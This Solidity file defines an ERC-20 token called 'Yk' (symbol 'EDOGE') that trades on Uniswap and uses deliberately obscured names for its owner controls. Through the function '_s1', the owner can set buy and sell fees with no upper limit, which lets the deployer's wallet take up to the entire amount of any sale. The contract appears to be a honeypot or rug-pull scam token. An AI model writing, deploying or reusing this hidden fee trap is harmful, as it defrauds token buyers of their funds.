// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract B1 { function _s() internal view virtual returns (address) { return msg.sender; } }
contract B2 is B1 {
    address private _z;
    event E1(address indexed _pn, address indexed _n);
    constructor() { _z = _s(); emit E1(address(0), _z); }
    function _zz() public view returns (address) { return _z; }
    modifier _m() { require(_z == _s(), "B2: caller is not the _zz"); _; }
    function _r() public virtual _m { emit E1(_z, address(0)); _z = address(0); }
    function _t(address _n) public virtual _m { require(_n != address(0)); emit E1(_z, _n); _z = _n; }
}
interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 { function factory() external pure returns (address); function WETH() external pure returns (address); }


contract ERC20 is B1 {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string public name; string public symbol; uint8 public constant decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _zz, address indexed spender, uint256 value);
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function totalSupply() public view returns (uint256) { return _totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) public returns (bool) { _transfer(_s(), to, amount); return true; }
    function allowance(address o, address s) public view returns (uint256) { return _allowances[o][s]; }
    function approve(address s, uint256 amount) public returns (bool) { _approve(_s(), s, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 cur = _allowances[from][_s()];
        require(cur >= amount, "ERC20: insufficient allowance");
        _approve(from, _s(), cur - amount);
        _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "zero");
        uint256 fb = _balances[from]; require(fb >= amount, "balance");
        _balances[from] = fb - amount; _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
    function _mint(address to, uint256 amount) internal { _totalSupply += amount; _balances[to] += amount; emit Transfer(address(0), to, amount); }
    function _approve(address o, address s, uint256 amount) internal { _allowances[o][s] = amount; emit Approval(o, s, amount); }
}

contract Yk is ERC20, B2 {
    address public _p;
    address public _w;
    uint256 public _f1 = 3;
    uint256 public _f2 = 3;
    mapping(address => bool) public _e;
    constructor(address _q) ERC20("Yk", "EDOGE") {
        _p = _q; _w = msg.sender; _e[msg.sender] = true;
        _mint(msg.sender, 1e27);
    }
    function _s1(uint256 _i, uint256 _j) external _m { _f1 = _i; _f2 = _j; }
    function _x(address a, bool v) external _m { _e[a] = v; }
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 _l = 0;
        if (!_e[from] && !_e[to]) {
            if (from == _p) { _l = _f1; }
            else if (to == _p) { _l = _f2; }
        }
        uint256 _l2 = amount * _l / 100;
        if (_l2 > 0) { super._transfer(from, _w, _l2); }
        super._transfer(from, to, amount - _l2);
    }
}
